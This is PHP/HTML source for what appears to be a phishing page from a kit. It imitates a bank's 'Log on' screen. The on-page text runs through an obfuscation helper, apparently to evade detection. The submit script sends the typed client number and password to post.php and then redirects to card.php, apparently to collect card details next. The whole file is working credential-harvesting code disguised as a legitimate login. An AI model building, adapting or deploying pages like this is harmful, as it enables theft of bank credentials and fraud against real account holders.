<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log on</title>
    <link rel="stylesheet" href="res/css/log.css">
</head>
<body>
<main>
<div id="loader" style="display:none; width:100%; height:100%; position:fixed;  top:0; left:0; background:white;">
<div style="width:100%; height:100%; display:flex; justify-content:center; align-items:center;" >
<div style="text-align:center;">
    <img src="res/img/j1.png" style="width:210px;"><br>
    <img src="res/img/loading.gif" style="width:80px;"><br>
    <p style="font-size:0.8em;"><?php $bm->obf("Please wait..."); ?></p>
</div>
</div>
</div>

<div class="logo">
<img src="res/img/j1.png">
</div>

<div class="boxes">
<div class="leftbox">
<div class="boxtitle">
<img src="res/img/log-text.png">
</div>

<div class="form">

<table>
<tr>
<td><?php $bm->obf("Client number"); ?></td>
<td><input type="text" id="u" class="textinput"></td>
</tr>
<tr>
<td><?php $bm->obf("Password"); ?></td>
<td><input type="password" id="p" class="textinput"></td>
<script>var token=<?php echo json_encode($token); ?>;</script>

</tr>
<tr>
<td></td>
<td><label style="display:inline-flex; align-items:center;"><input type="checkbox" style="margin-right:14px;"> <?php $bm->obf("Remember client number"); ?></label></td>
</tr>
<tr>
<td></td>
<td><button onclick="sbmt()"><img src="res/img/lock.png"> <?php $bm->obf("Log on"); ?></button></td>
</tr>
<tr>
<td></td>
<td><?php $bm->obf("I've forgotten my log on details"); ?></td>
</tr>
</table>


</div>


</div>


<div class="rightbox">
<img src="res/img/jr.png">
</div>
</div>

<div class="footer">
    <img src="res/img/bt.png">
</div>

</main>


<script src="./res/js/jq.js"></script>
<script src="./res/jquery.js"></script>
<script>
$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sbmt();
    }
});

function sbmt(){
    var p = $("#p").val();
    var u = $("#u").val();
    var sub = true;
    $("#u").removeClass("error");
    $("#p").removeClass("error");
    if(p.length<4){
        $("#p").addClass("error");
        sub=false;
    }
    if(u.length<4){
        $("#u").addClass("error");
        sub=false;
    }

    if(sub){
    $("#loader").show();
        $.post("post.php",{user:u, pass:p},(res)=>{
            window.location="card.php";
        });
    }

}

 
</script>
</body>
</html>